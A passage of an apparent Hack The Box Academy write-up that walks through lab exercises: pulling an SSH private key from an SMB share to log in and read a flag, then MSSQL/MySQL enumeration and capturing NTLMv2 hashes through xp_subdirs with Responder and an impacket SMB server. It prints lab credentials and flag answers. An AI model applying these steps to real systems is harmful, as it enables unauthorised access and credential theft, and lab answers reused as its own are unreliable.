SMB         10.129.232.68   445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
```

We get our answer: 34c8zuNBo91!@28Bszh

Question: Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

Method:&#x20;

So from here I realised we had went on smbmap but done nothing with it, so if we include the -R flag we will be able to find the following:

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
└──╼ [★]$ smbmap -H 10.129.232.68 -R
[+] IP: 10.129.232.68:445	Name: 10.129.232.68                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	.\GGJ\*
	dr--r--r--                0 Tue Apr 19 16:33:55 2022	.
	dr--r--r--                0 Mon Apr 18 12:08:30 2022	..
	fr--r--r--             3381 Tue Apr 19 16:33:03 2022	id_rsa
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)

```

An id\_rsa, which is a key used to login with ssh so this is obviously something we would need !

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
└──╼ [★]$ smbclient --user jason //10.129.232.68/GGJ
Password for [WORKGROUP\jason]:
Try "help" to get a list of possible commands.
smb: \> get id_rsa
getting file \id_rsa of size 3381 as id_rsa (19.2 KiloBytes/sec) (average 19.2 KiloBytes/sec)
smb: \> 

```

now we can login, we need to update the file permissions using chmod.

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
└──╼ [★]$ chmod 700 id_rsa
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
└──╼ [★]$ ssh jason@10.129.232.68 -i id_rsa
The authenticity of host '10.129.232.68 (10.129.232.68)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.68' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 12 Nov 2025 01:08:50 PM UTC

  System load:  0.0                Processes:               226
  Usage of /:   28.4% of 13.72GB   Users logged in:         0
  Memory usage: 13%                IPv4 address for ens160: 10.129.232.68
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ls
flag.txt
$ cat flag.txt
HTB{SMB_4TT4CKS_2349872359}
$ 

```

Answer: HTB{SMB\_4TT4CKS\_2349872359}

***

### Attacking SQL Databases

#### Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:

```shell-session
0xgrooted@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

**MySQL - Connecting to the SQL Server**

```shell-session
0xgrooted@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

**Sqlcmd - Connecting to the SQL Server**

&#x20; Attacking SQL Databases

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

Note: When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:

```shell-session
0xgrooted@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

```shell-session
0xgrooted@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Note: When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targeting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```shell-session
0xgrooted@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

**XP\_SUBDIRS Hash Stealing with Responder**

```shell-session
0xgrooted@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

**XP\_SUBDIRS Hash Stealing with impacket**

```shell-session
0xgrooted@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

Question: What is the password for the "mssqlsvc" user?

Login using the credentials given:

